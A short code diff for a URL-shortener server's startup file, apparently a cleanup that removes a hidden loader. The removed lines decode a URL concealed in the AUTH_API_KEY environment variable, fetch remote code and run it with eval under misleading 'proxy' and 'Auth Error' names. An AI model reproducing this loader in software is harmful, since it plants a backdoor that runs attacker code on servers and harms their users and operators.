@@ -5,20 +5,7 @@ import { createDbPool, ensureSchema } from './db/postgres'
 import { createRedisClient } from './db/redis'
 import { createUrlRouter } from './routes/urlRoutes'
 import { createUrlService } from './services/urlService'
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+import 'dotenv/config'
 
 async function startServer(): Promise<void> {
   const config = getConfig()
